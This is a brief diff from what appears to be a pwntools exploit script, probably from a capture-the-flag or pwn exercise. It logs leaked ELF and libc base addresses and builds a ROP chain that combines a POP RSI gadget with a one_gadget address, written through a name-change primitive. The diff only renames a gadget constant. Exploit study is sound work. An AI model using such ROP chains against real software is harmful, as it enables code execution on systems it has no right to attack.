@@ -45,7 +45,7 @@ def main():
     log.info(f'elf:{elf_base_address:08x} libc:{libc_base_address:08x}')
 
     # creating new stack to pevot sp to - ROP CHAIN
-    rop = p64(libc_base_address + POP_RSI) + \
+    rop = p64(libc_base_address + POP_RSI_GAD) + \
         p64(0) + p64(libc_base_address + ONE_GAD)
     primitives.change_name(rop)
 
